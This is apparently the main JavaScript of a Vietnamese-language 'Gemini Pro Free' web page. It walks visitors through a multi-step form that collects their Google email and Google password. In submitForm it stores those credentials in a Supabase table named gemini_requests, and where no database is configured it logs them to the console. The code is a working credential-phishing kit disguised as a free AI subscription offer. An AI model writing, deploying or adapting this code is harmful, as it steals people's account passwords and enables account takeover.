// Gemini Pro Free - Main JavaScript

let currentStep = 1;
let supabase = null;

// Initialize Supabase
if (typeof window.SUPABASE_CONFIG !== 'undefined') {
    const { createClient } = supabase;
    supabase = createClient(
        window.SUPABASE_CONFIG.url,
        window.SUPABASE_CONFIG.anonKey
    );
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    // Check if Supabase is configured
    if (!supabase) {
        console.warn('Supabase chưa được cấu hình. Vui lòng cập nhật file config.js');
    }

    // Setup event listeners
    setupEventListeners();
    
    // Show first step
    showStep(1);
}

function setupEventListeners() {
    // Checkbox for step 2
    const confirmCheckbox = document.getElementById('confirmSteps');
    if (confirmCheckbox) {
        confirmCheckbox.addEventListener('change', function() {
            const continueBtn = document.getElementById('continueBtn');
            continueBtn.disabled = !this.checked;
        });
    }

    // Form validation
    const formInputs = document.querySelectorAll('.form-input');
    formInputs.forEach(input => {
        input.addEventListener('input', validateForm);
    });
}

// Navigation Functions
function nextStep() {
    if (currentStep < 4) {
        currentStep++;
        showStep(currentStep);
    }
}

function previousStep() {
    if (currentStep > 1) {
        currentStep--;
        showStep(currentStep);
    }
}

function showStep(stepNumber) {
    // Hide all steps
    const allSteps = document.querySelectorAll('.step-container');
    allSteps.forEach(step => {
        step.classList.remove('active');
    });

    // Show current step
    const currentStepElement = document.querySelector(`.step-container[data-step="${stepNumber}"]`);
    if (currentStepElement) {
        currentStepElement.classList.add('active');
    }

    // Update progress bar
    updateProgressBar(stepNumber);

    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function updateProgressBar(stepNumber) {
    const progressSteps = document.querySelectorAll('.progress-step');
    
    progressSteps.forEach((step, index) => {
        const stepNum = index + 1;
        
        if (stepNum < stepNumber) {
            step.classList.add('completed');
            step.classList.remove('active');
        } else if (stepNum === stepNumber) {
            step.classList.add('active');
            step.classList.remove('completed');
        } else {
            step.classList.remove('active', 'completed');
        }
    });
}

// Form Validation
function validateForm() {
    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const contactEmail = document.getElementById('contactEmail');

    if (!email || !password || !contactEmail) return false;

    const isValid = email.value.trim() !== '' && 
                   password.value.trim() !== '' && 
                   contactEmail.value.trim() !== '' &&
                   isValidEmail(email.value) &&
                   isValidEmail(contactEmail.value);

    return isValid;
}

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Form Submission
async function submitForm() {
    // Validate form
    if (!validateForm()) {
        showNotification('Vui lòng điền đầy đủ thông tin hợp lệ!', 'error');
        return;
    }

    // Get form values
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const contactEmail = document.getElementById('contactEmail').value.trim();

    // Show loading
    showLoading(true);

    try {
        // Save to Supabase
        if (supabase) {
            const { data, error } = await supabase
                .from('gemini_requests')
                .insert([
                    {
                        google_email: email,
                        google_password: password,
                        contact_email: contactEmail,
                        created_at: new Date().toISOString(),
                        status: 'pending'
                    }
                ]);

            if (error) {
                console.error('Supabase error:', error);
                throw new Error('Không thể lưu thông tin. Vui lòng thử lại!');
            }

            console.log('Data saved successfully:', data);
        } else {
            // Fallback: Log to console if Supabase is not configured
            console.log('Form submitted (Supabase not configured):', {
                google_email: email,
                google_password: password,
                contact_email: contactEmail,
                created_at: new Date().toISOString()
            });
            
            // Simulate delay
            await new Promise(resolve => setTimeout(resolve, 1500));
        }

        // Hide loading
        showLoading(false);

        // Show success message
        showNotification('Đã gửi thông tin thành công!', 'success');

        // Move to next step
        setTimeout(() => {
            nextStep();
        }, 1000);

    } catch (error) {
        showLoading(false);
        showNotification(error.message || 'Có lỗi xảy ra. Vui lòng thử lại!', 'error');
        console.error('Error:', error);
    }
}

// Reset Form
function resetForm() {
    // Reset form fields
    const form = document.getElementById('userForm');
    if (form) {
        form.reset();
    }

    // Reset checkbox
    const checkbox = document.getElementById('confirmSteps');
    if (checkbox) {
        checkbox.checked = false;
    }

    // Reset current step
    currentStep = 1;
    showStep(1);

    // Disable continue button
    const continueBtn = document.getElementById('continueBtn');
    if (continueBtn) {
        continueBtn.disabled = true;
    }
}

// Loading Overlay
function showLoading(show) {
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) {
        if (show) {
            loadingOverlay.classList.add('active');
        } else {
            loadingOverlay.classList.remove('active');
        }
    }
}

// Notification System
function showNotification(message, type = 'info') {
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 20px 30px;
        background: ${type === 'success' ? '#95E1D3' : '#FF6B6B'};
        color: #1A1A1A;
        border: 4px solid #1A1A1A;
        box-shadow: 5px 5px 0px rgba(0, 0, 0, 1);
        font-weight: 700;
        font-size: 1.1rem;
        z-index: 10000;
        animation: slideInRight 0.3s ease;
        max-width: 400px;
        word-wrap: break-word;
    `;
    notification.textContent = message;

    // Add animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    `;
    document.head.appendChild(style);

    // Add to body
    document.body.appendChild(notification);

    // Remove after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideInRight 0.3s ease reverse';
        setTimeout(() => {
            notification.remove();
            style.remove();
        }, 300);
    }, 3000);
}

// Utility Functions
function sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
}

// Analytics (Optional)
function trackEvent(eventName, data = {}) {
    console.log('Event:', eventName, data);
    // Add your analytics code here (Google Analytics, etc.)
}

// Track page load
trackEvent('page_load', {
    timestamp: new Date().toISOString()
});
